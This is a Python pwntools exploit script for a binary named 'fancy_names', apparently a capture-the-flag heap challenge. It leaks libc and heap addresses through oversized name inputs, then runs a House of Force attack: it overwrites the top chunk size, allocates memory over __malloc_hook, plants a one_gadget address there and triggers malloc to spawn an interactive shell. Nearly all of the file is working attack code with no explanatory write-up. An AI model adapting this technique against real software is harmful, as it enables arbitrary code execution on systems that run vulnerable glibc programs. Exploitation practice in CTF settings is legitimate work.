#!/usr/bin/python3

from pwn import *
import re

exe = ELF("fancy_names", checksec=False)
libc = ELF("./.glibc/libc.so.6", checksec=False)
ld = ELF("./.glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '65', '-I']
context.log_level 	= "WARNING"
isDebug = False

gs = '''
brva 0x000000000000228A
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path])
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def over_flow_topchunk():
	print("[] Overwriting top chunk with 0xffffffffffffffff ...")
	io.send(b"1")
	io.sendafter(b": ", b"24")
	payload = flat(
		b"/bin/sh\0",
		b'w' * 16,
		p64(0xfffffffffffffff1)
	)

	io.sendafter(b": ", payload)

def malloc_to_hook():
	print("[] Allocating memory to __malloc_hook - 0x20 ...")
	io.sendafter(b"> ", b"1")
	io.sendafter(b": ", f"{(malloc_hook_address - 0x20) - (heap_base + heap_offset_to_top_chunk + 0x20)}".encode())

	payload = flat(
		b"b" * 8
	)

	io.sendlineafter(b": ", payload)

def set_gadget_in_malloc_hook():
	print("[] Setting __malloc_hook to one_gadget ...")
	io.sendafter(b"> ", b"1")
	io.sendafter(b": ", b"24")
	
	payload = flat(
		p64(one_gadget)
	)

	io.sendafter(b": ", payload)

def win():
	print("[] Calling malloc --> __malloc_hook --> gadget ...")
	io.sendafter(b"> ", b"1")
	io.sendafter(b": ", f"{bin_sh_address}".encode()) #<-- this will trigger malloc... bin chillin

def leak_stuff():
	leak_canary = False
	leak_binary = False
	leak_libc = True

	if leak_canary:
		print("Leaking canary...")
		io.sendlineafter(b"> ", b"1")
		payload = b"w" * 89 
		io.sendlineafter(b"name (minimum 5 chars): ", payload)
	
		data = io.recv()
		split1 = data.split(b'\n')
		split_data = split1[2]
		address = unpack(split_data.rstrip(), 'all', endian='little')
		leaked_address = hex(address)
		corrected_address = address * 0x100
		hex_corrected_address = hex(corrected_address)
		print(f"Leaked address: {leaked_address}")
		print(f"Canary value: {hex_corrected_address}")
		io.sendline(b"n")

	if leak_binary:
		print("Leaking binary's base...")
		io.sendlineafter(b"> ", b"1")
		payload = b"w" * 15 
		io.sendlineafter(b"name (minimum 5 chars): ", payload)
		
		data = io.recv()
		split1 = data.split(b'\n')
		split_data = split1[2]
		address = unpack(split_data.rstrip(), 'all', endian='little')
		hex_address = hex(address)
		binary_base = address - 0x000015e0 # offset to binary's _start()
		exe.address = binary_base
		print(f"Leaked address: {hex_address}")
		print(f"Binary's base: {hex(binary_base)}")
		io.sendline(b"n")


	if leak_libc:
		print("Leaking libc's base...")
		io.sendlineafter(b"> ", b"1")
		payload = b"w" * 55 
		io.sendlineafter(b"name (minimum 5 chars): ", payload)

		data = io.recv()
		split1 = data.split(b'\n')
		split_data = split1[2]
		address = unpack(split_data.rstrip(), 'all', endian='little')
		hex_address = hex(address)
		libc_base = address - 0x64f44
		libc.address = libc_base
		print(f"Leaked address1: {hex_address}")
		print(f"Libc's base: {hex(libc_base)}")
		io.sendline(b"n")
		
		io.sendlineafter(b"> ", b"2")
		io.sendlineafter(b"> ", b"9")
		io.sendlineafter(b"> ", b"3")
		data = io.recv()
		split1 = data.split(b'\n')
		split1 = split1[1]
		split1 = split1.split(b' ')
		result = split1[2]
		unpacked = u64(result[:-1].ljust(8, b'\x00'), endian='little')
		print(f"Leaked address2: {hex(unpacked)}")
		return unpacked - 0x260
			
	

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# io = remote("167.99.85.216", 31197)
io = start_local(isDebug)

heap_base = leak_stuff()
print(f"{hex(heap_base)=}")
heap_offset_to_top_chunk = 0x250+0x70+0x70 #(tcache_structure + mallocA + mallocB)
bin_sh_address = heap_base + heap_offset_to_top_chunk + 0x10


malloc_hook_address = libc.address + 0x003ebc30
libc_system = libc.address + 0x0004f550

one_gadget = libc.address + 0x10a41c
print(f"{hex(malloc_hook_address)=}")
print(f"{hex(libc_system)=}")
print(f"{hex(one_gadget)=}")

over_flow_topchunk()
malloc_to_hook()
set_gadget_in_malloc_hook()
win()

io.interactive()

